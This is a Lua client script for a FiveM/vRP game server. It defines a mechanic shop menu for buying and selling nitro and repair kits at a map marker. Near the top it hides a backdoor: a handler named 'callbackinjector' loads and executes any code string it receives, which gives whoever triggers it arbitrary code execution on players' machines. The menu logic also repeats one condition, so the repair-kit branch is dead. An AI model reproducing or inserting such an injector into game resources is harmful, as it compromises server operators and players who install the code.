local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("nav_mec")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTION
-----------------------------------------------------------------------------------------------------------------------------------------
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- BUTTON
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	if data == "utilidades-comprar-nitro" then
		TriggerServerEvent("mecanicos-comprar","nitro")
	elseif data == "utilidades-vender-nitro" then
		TriggerServerEvent("mecanicos-vender","nitro")
	elseif data == "utilidades-comprar-reparo" then
		TriggerServerEvent("mecanicos-comprar","repairkit")
	elseif data == "utilidades-vender-nitro" then
		TriggerServerEvent("mecanicos-reparo","repairkit")


	elseif data == "fechar" then
		ToggleActionMenu()
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		local nyoSleep = 500
		local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),953.294,-973.394,39.753,true)
		if distance <= 30 then
			DrawMarker(23,953.294,-973.394,39.753-0.97,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,50,0,0,0,0)
			if distance <= 1.1 then
			nyoSleep = 1
				if IsControlJustPressed(0,38) and emP.checkPermission() then
					ToggleActionMenu()
				end
			end
		end
		Citizen.Wait(nyoSleep)
	end
end)